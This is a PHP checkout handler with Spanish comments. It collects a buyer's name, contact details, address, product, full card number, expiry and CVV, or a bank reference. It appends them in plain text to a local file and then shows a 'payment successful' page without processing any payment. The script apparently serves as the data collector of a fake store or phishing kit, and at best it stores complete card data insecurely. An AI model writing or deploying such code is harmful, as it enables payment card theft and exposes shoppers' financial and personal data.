<?php
require "../config.php";

// Asegurar método POST
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: $base_url");
    exit;
}

// Datos Cliente
$nombre     = $_POST['nombre'] ?? '';
$email      = $_POST['email'] ?? '';
$direccion  = $_POST['direccion'] ?? '';
$cantidad   = $_POST['cantidad'] ?? '';
$telefono   = $_POST['telefono'] ?? '';

// Datos Producto
$marca      = $_POST['marca'] ?? '';
$id         = $_POST['id'] ?? '';
$producto   = $_POST['producto'] ?? '';

// Datos Pago
$metodo     = $_POST['metodo_pago'] ?? '';
$num_tarjeta = $_POST['num_tarjeta'] ?? '';
$vencimiento = $_POST['vencimiento'] ?? '';
$cvv        = $_POST['cvv'] ?? '';
$banco      = $_POST['banco'] ?? '';
$referencia = $_POST['referencia'] ?? '';

// Crear texto
$contenido  = "----- NUEVO PAGO -----\n";
$contenido .= "Fecha: " . date("Y-m-d H:i:s") . "\n";
$contenido .= "Nombre: $nombre\n";
$contenido .= "Correo: $email\n";
$contenido .= "Teléfono: $telefono\n";
$contenido .= "Dirección: $direccion\n\n";

$contenido .= "Producto: $marca - $producto (ID: $id)\n";
$contenido .= "Cantidad: $cantidad\n\n";

$contenido .= "Método de pago: $metodo\n";

if ($metodo === "tarjeta") {
    $contenido .= "Número Tarjeta: $num_tarjeta\n";
    $contenido .= "Vencimiento: $vencimiento\n";
    $contenido .= "CVV: $cvv\n";
} else {
    $contenido .= "Banco/Wallet: $banco\n";
    $contenido .= "Referencia: $referencia\n";
}

$contenido .= "----------------------\n\n";

// Guardar en archivo
file_put_contents("../info/pago.txt", $contenido, FILE_APPEND);

// Redirigir al mensaje final
header("Location: $base_url/comprar/pago_exitoso.php");
exit;
?>
